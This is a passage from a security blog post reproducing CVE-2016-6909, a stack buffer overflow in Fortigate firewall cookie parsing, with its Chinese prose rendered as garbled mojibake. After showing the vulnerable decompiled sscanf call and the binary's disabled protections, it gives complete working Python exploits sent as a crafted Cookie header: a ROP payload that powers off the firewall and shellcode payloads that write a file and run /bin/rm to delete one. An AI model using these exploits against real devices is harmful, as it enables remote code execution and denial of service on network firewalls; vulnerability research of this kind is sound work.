<p>Êàë‰ª¨‰∏çÈöæÂèëÁé∞ÂÖ∂ÊúÄÂêéË∞ÉÁî®ÁöÑ <code>sub_8329797()</code> ‰º†ÂèÇÂΩ¢ÂºèÂ∫îÂΩìÊòØÊåâÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ËøõË°åËß£ÊûêÔºåÊúÄÁªàÊãºÂáëÂá∫Êù•ÁöÑÂΩ¢ÂºèÂ∫îÂΩìÂ¶Ç <code>APSCOOKIE_114514</code> ÔºàÁ§∫‰æãÊï∞Â≠óÔºâÁöÑÂΩ¢ÂºèÔºåËÄå‰∏äÂ±ÇË∞ÉÁî®‰∏≠‰ΩøÁî® <code>strstr()</code> Âà§Êñ≠ v3 Âú® v2 ‰∏≠ÊòØÂê¶Â≠òÂú®ÔºåËøô‰∏™ÂΩ¢ÂºèÊàë‰ª¨‰∏éÊàë‰ª¨‰º†ÂÖ•ÁöÑ Cookie ÁöÑÂÜÖÂÆπÂºÄÂ§¥Áõ∏ÂêªÂêàÔºåÁî±Ê≠§Êàë‰ª¨ÂèØ‰ª•Êé®Êñ≠Âá∫Êé•‰∏ãÊù•ÁöÑ <code>sub_820CB5E()</code> ÂáΩÊï∞Â∫îÂΩìÊ∂âÂèäÂà∞ÂØπ Cookie ÁöÑËß£ÊûêÂ∑•‰Ωú</p>
<p>Êé•‰∏ãÊù•ÁªßÁª≠ÂàÜÊûê <code>sub_820CB5E()</code>Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_820CB5E</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">108</span>]; <span class="hljs-comment">// [esp+116Ch] [ebp-6Ch] BYREF</span><br><br>  size = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( a1 )<br>    size = <span class="hljs-built_in">strlen</span>(a1) + <span class="hljs-number">1</span>;<br>  src = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x52</span>u);<br>  v16 = <span class="hljs-number">20</span>;<br>  <span class="hljs-built_in">memset</span>(v21, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v21));<br>  ptr = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    sub_820C6F0();<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sscanf</span>(a1, <span class="hljs-string">&quot;Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s&quot;</span>, &amp;v17, v21, s) == <span class="hljs-number">3</span> )<br>    &#123;<br>...<br></code></pre></td></tr></table></figure>

<p>ÂÅö pwn ÁöÑÂêåÂ≠¶Â∫îËØ•<strong>Á¨¨‰∏ÄÁúºÂ∞±ËÉΩÂ§üÁúãÂà∞‰∏Ä‰∏™Â§ßÂ§ßÁöÑ %s Êò†ÂÖ•‰Ω†ÁöÑÁúºÂ∏òÔºåÂçÅÂàÜÊòéÊòæÁöÑ‰∏Ä‰∏™Ê†àÊ∫¢Âá∫</strong>ÔºåÊàë‰ª¨ÁöÑÊºèÊ¥û‰æø‰Ωç‰∫éËøô‰∏™‰ΩçÁΩÆÔºöÂØπ Cookie ÂÜÖÂÆπÁöÑËß£Êûê‰ΩøÁî®‰∫Ü‰∏çÂÆâÂÖ®ÁöÑ <code>%s</code> ËØªÂèñ AuthHash Âà∞Ê†à‰∏ä‰ªéËÄå‰ΩøÂæóÂÖ∂Â≠òÂú®Ê†àÊ∫¢Âá∫ÊºèÊ¥û</p>
<blockquote>
<p>Ëøô‰∏™Âπ¥‰ª£ËøòÊúâÈíàÂØπ <code>%s</code> ÁöÑÊºèÊ¥ûÂ±ûÂÆû‰ª§‰∫∫Ê≥™ÁõÆ</p>
</blockquote>
<h1 id="0x02-ÊºèÊ¥ûÂà©Áî®"><a href="#0x02-ÊºèÊ¥ûÂà©Áî®" class="headerlink" title="0x02.ÊºèÊ¥ûÂà©Áî®"></a>0x02.ÊºèÊ¥ûÂà©Áî®</h1><p>httpsd ‰∏∫ÂØπ init ÁöÑËΩØÈìæÊé•ÔºåÈ¶ñÂÖàÊàë‰ª¨ÂÖàÂØπ init Á®ãÂ∫èËøõË°åÂÆâÂÖ®Ê£ÄÊü•Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec ./init</span><br>[*] &#x27;/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br>    RPATH:    b&#x27;../lib:../ulib:/fortidev/lib:/lib&#x27;<br></code></pre></td></tr></table></figure>

<p><strong>‰øù  Êä§  ÂÖ®  ÂÖ≥</strong>ÔºåÊàë‰ª¨ÊúâÁõ∏ÂΩìÂ§ßÁöÑÊìç‰ΩúÁ©∫Èó¥</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>Áî±‰∫éÂÖ∂‰∏é‰º†Áªü pwn È¢òÁöÑ‰∫§‰∫íÁïåÈù¢‰∏çÂêåÔºåÊàë‰ª¨Âè™Êúâ‰∏ÄÊ¨° post ÁöÑÊú∫‰ºöÔºåÊâÄ‰ª•ÈúÄË¶ÅÂú®Ëøô‰∏ÄÊ¨° post ‰∏≠<strong>‰∏Ä  Ê≠•  Âà∞  ‰Ωç</strong>ÔºåÁõ∏Â∫îÂú∞ÔºåËôΩÁÑ∂Êàë‰ª¨Êó†Ê≥ïÈÄöËøá‰∫§‰∫íËé∑Âèñ libcÔºå‰ΩÜÊòØÂú® init Êñá‰ª∂‰∏≠ÊúâÁùÄÂ§ßÈáèÁöÑ gadgetÔºåÂèàÊ≤°ÂºÄ PIEÔºåÊïÖÁõ¥Êé• ret2text Âç≥ÂèØ</p>
<p>ÂÖàËØï‰∏Ä‰∏ãÊàë‰ª¨ÊòØÂê¶ÁúüÁöÑËÉΩÁõ¥Êé•ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅÔºåÈöè‰æøÊâæ‰∏ÄÊÆµ gadget ÁÆÄÂçïËØï‰∏Ä‰∏ãÔºåÁ¨îËÄÖËøôÈáåÈÄâÁî®‰∫Ü‰∏ÄÊÆµÂÖ≥Êú∫‰ª£Á†Å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:080601AE                 push    4321FEDCh       ; howto<br>.text:080601B3                 call    _reboot<br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>reboot(RB_POWER_OFF)</code></p>
</blockquote>
<p>http ËØ∑Ê±ÇÂ§¥ÁöÑÈïøÂ∫¶ÊØ´Êó†ÁñëÈóÆËÉΩÂ§üÊª°Ë∂≥Êàë‰ª¨ÂØπ payload ÁöÑË¶ÅÊ±ÇÔºåÊïÖÁ¨îËÄÖËøôÈáåÁõ¥Êé•‰ΩøÁî®Â§ßÈáèÁöÑ <code>ret</code> Êåá‰ª§‰Ωú‰∏∫ slide codeÔºåÁúÅÂéªËÆ°ÁÆóÊ∫¢Âá∫ÈïøÂ∫¶ÁöÑÂøÖË¶ÅÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#e = ELF(&#x27;./init&#x27;)</span><br>url = <span class="hljs-string">&#x27;http://192.168.116.100/index&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate,br&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, <br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;192.168.116.100&#x27;</span>, <br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=√´Y√ø√°√®√∏√ø√ø√øPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="hljs-string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="hljs-number">100</span> + <span class="hljs-string">&#x27;\xae\x01\x06\x08&#x27;</span><br>    &#125;<br><br>r = post(url, headers = headers)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(r.headers)<br></code></pre></td></tr></table></figure>

<p>ÂèØ‰ª•ÂèëÁé∞ fortigate VM Ë¢´ÊàêÂäüÂÖ≥Êú∫Ôºö</p>
<blockquote>
<p>Â•ΩÂÉèÊ≤°Âï•ÊÑè‰πâÁöÑÊà™ÂõæÔºàÔºâ</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/NDWXjeBoVsZla8U.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ROPÈìæÁöÑÊãºÊé•ËæÉ‰∏∫ÁπÅÁêêÔºå‰∏îÂØπ‰∫é <code>%s</code> ËÄåË®Ä<strong>Á©∫ÁôΩÂ≠óÁ¨¶Êó†Ê≥ïË¢´ÊçïËé∑</strong>ÔºåÁî±‰∫éÊ≤°ÊúâÂºÄÂêØ NX ‰øùÊä§ÔºåÊàë‰ª¨ÂèØ‰ª•ËÄÉËôëÈÄöËøá<code>jmp esp</code> ÁöÑ gadget Êù•<strong>Áõ¥Êé•ÊâßË°å shellcode</strong></p>
<p>ÂΩìÁÑ∂ÔºåÊúâÁöÑÂäüËÉΩÂÖ∂ÂÆûËøòÊòØÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® init Êñá‰ª∂‰∏≠Â≠òÂú®ÁöÑÂáΩÊï∞ÁöÑÔºåÊØîÂ¶ÇËØ¥ open Âíå write</p>
<p><img src="https://i.loli.net/2021/08/14/fr8sKmHFYdP6u5R.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/14/KDIwvXnT2OCMGsi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>‰∏ãÈù¢ËøôÊÆµ‰ª£Á†ÅË∞ÉÁî®‰∫Ü open ËøõË°å‰∫ÜÊñá‰ª∂ÁöÑÂàõÂª∫Âπ∂ÂêëÊñá‰ª∂ÂÜÖÂÜôÂÖ•‰∫ÜÂ≠óÁ¨¶‰∏≤ <code>arttnba3</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#e = ELF(&#x27;./init&#x27;)</span><br>url = <span class="hljs-string">&#x27;http://192.168.116.100/index&#x27;</span><br><br>cookie = <span class="hljs-string">&#x27;&#x27;</span><br>cookie += <span class="hljs-string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=√´Y√ø√°√®√∏√ø√ø√øPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span><br>cookie += <span class="hljs-string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="hljs-number">100</span> <span class="hljs-comment"># ret</span><br>cookie += <span class="hljs-string">&#x27;\xf7\xbd\x96\x08&#x27;</span> <span class="hljs-comment"># add eax, ebp ; jmp esp</span><br><span class="hljs-comment"># following are shellcode</span><br>cookie += <span class="hljs-string">&#x27;\x90&#x27;</span> * <span class="hljs-number">0x80</span> <span class="hljs-comment"># slide code nop</span><br>cookie += <span class="hljs-string">&#x27;1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3&#x27;</span> <span class="hljs-comment"># &#x27;xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx&#x27;</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate,br&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, <br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;192.168.116.100&#x27;</span>, <br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:cookie<br>    &#125;<br><br>r = post(url, headers = headers)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(r.headers)<br></code></pre></td></tr></table></figure>

<p>ÂèëÈÄÅ http ËØ∑Ê±ÇÔºåÊàë‰ª¨ÊàêÂäüÂú∞Âú®Èò≤ÁÅ´Â¢ôÂÜÖÂàõÂª∫Êñá‰ª∂Âπ∂ÂÜôÂÖ•ÁâπÂÆöÂÜÖÂÆπ</p>
<p><img src="https://i.loli.net/2021/08/14/yWfmvxl4DKPBGc1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>‰∏ãÂàó shellcode ÈÄöËøáÁ≥ªÁªüË∞ÉÁî® execve Ë∞ÉÁî® <code>/bin/rm</code> Âà†Èô§Êàë‰ª¨ÁöÑ flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br>cookie += <span class="hljs-string">&#x27;1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80&#x27;</span> <span class="hljs-comment"># &#x27;xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80&#x27;</span><br>...<br></code></pre></td></tr></table></figure>

<p>ÂèëÈÄÅ http ËØ∑Ê±ÇÔºåÂèØ‰ª•ÁúãÂà∞ flag Êñá‰ª∂Â∑≤Ë¢´Âà†Èô§</p>
<p><img src="https://i.loli.net/2021/08/14/I2PUGYa5TSoXuvN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>Êé•‰∏ãÊù•Êàë‰ª¨‰æøÂèØ‰ª•‰ΩøÁî®Ëá™Â∑±ÊûÑÈÄ†ÁöÑ shellcode ‰∏∫ÊâÄÊ¨≤‰∏∫‰∫ÜÔºåÁΩë‰∏ä‰πüÊúâÂæàÂ§ö shellcode ÁîüÊàêÂ∑•ÂÖ∑ÔºåËøôÈáåÁ¨îËÄÖ‰æø‰∏çÂÜçÁã¨Á´ãË¥¥Âá∫ÂÖ∂‰ªñ shellcode ‰∫Ü</p>
<h1 id="0x03-What‚Äôs-more‚Ä¶"><a href="#0x03-What‚Äôs-more‚Ä¶" class="headerlink" title="0x03.What‚Äôs more‚Ä¶"></a>0x03.What‚Äôs more‚Ä¶</h1><p>ÂÆâÂÖ®‰∫ßÂìÅÊòØ‰∏∫‰∫ÜÁ°Æ‰øùÂÆâÂÖ®ËÄåÂºïÂÖ•ÁöÑÔºå‰ΩÜÂÆâÂÖ®‰∫ßÂìÅÂèà‰ºöÊúâÊñ∞ÁöÑÂÆâÂÖ®ÈóÆÈ¢òÔºåËøô‰∏™Êó∂ÂÄôÂèàË¶ÅÂºïÂÖ•Êñ∞ÁöÑÂÆâÂÖ®‰∫ßÂìÅÊù•Á°Æ‰øùÂÆâÂÖ®‰∫ßÂìÅÁöÑÂÆâÂÖ®ÔºåÁÑ∂Âêé‰æøÊòØÊó†ÈôêÂ•óÂ®É‚Ä¶</p>
<p>Á¨îËÄÖËÆ§‰∏∫Ôºå<strong>„ÄåÂÆâÂÖ®ÈóÆÈ¢òÊú¨Ë¥®‰∏äËøòÊòØ‰∫∫ÁöÑÈóÆÈ¢ò„Äç</strong>ÔºåÂè™ÊúâÊàë‰ª¨ÊØè‰∏Ä‰ΩçÂºÄÂèëËÄÖÈÉΩÁúüÊ≠£ÈáçËßÜËµ∑ÂÆâÂÖ®ÈóÆÈ¢òÔºåÂæàÂ§öÊ≤°ÊúâÂøÖË¶ÅÁöÑÊçüÂ§±ÊâçËÉΩÂæó‰ª•ÈÅøÂÖç</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/ret2text/">#ret2text</a>
      
        <a href="/tags/ROP/">#ROP</a>
      
        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#Ê†àÊ∫¢Âá∫</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/shellcode/">#shellcode</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
        <a href="/tags/ret2shellcode/">#ret2shellcode</a>
      
        <a href="/tags/Fortigate/">#Fortigate</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>„ÄêCVE.0x03„ÄëCVE-2016-6909 Fortigate Èò≤ÁÅ´Â¢ô Cookie Ëß£ÊûêÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê</div>
      <div>http://blog.arttnba3.cn/2021/08/10/CVE-0X03-CVE-2016-6909/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2021Âπ¥8Êúà10Êó•</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>ËÆ∏ÂèØÂçèËÆÆ</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/17/CVE-0X04-CVE-2020-27867/" title="„ÄêCVE.0x04„ÄëCVE-2020-27867 NETGEAR Ë∑ØÁî±Âô® RCE ÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">„ÄêCVE.0x04„ÄëCVE-2020-27867 NETGEAR Ë∑ØÁî±Âô® RCE ÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê</span>
                        <span class="visible-mobile">‰∏ä‰∏ÄÁØá</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/03/CVE-0X02-CVE-2017-5123/" title="„ÄêCVE.0x02„ÄëCVE-2017-5123 waitid ÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê">
                        <span class="hidden-mobile">„ÄêCVE.0x02„ÄëCVE-2017-5123 waitid ÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"ËØ¥ÁÇπ‰ªÄ‰πàÂëóÔºàÁ¨ëÔºâ","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ÁõÆÂΩï</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
